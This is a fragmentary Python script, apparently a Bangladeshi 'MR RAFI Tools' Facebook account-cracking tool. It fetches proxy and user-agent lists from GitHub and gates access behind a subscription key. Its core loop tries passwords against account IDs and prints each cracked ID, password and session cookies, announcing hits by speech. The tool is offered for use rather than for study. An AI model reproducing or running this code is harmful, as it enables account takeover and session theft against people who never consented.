...
princp=[]
try:
	prox= requests.get('https://github.com/cyberrafi-31/cyberrafi-31/blob/main/Porn.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/cyberrafi-31/cyberrafi-31/blob/main/Cyber.txt').text
		ua=open('.bbnew.txt','w')
...
os.system('espeak -a 300 " Welcome,   to,  𝐌𝐑 ,  𝐑𝐀𝐅𝐈,  Tools"')
...
╠══[Facebook                 • 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘 ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘 ]   ║\33[1;34m   
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•𝐌𝐑 𝐑𝐀𝐅𝐈-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " 𝐌𝐑 𝐑𝐀𝐅𝐈,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/cyberrafi-31/cyberrafi-31/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m 𝐌𝐑 𝐑𝐀𝐅𝐈, ToOLs Daily Update")
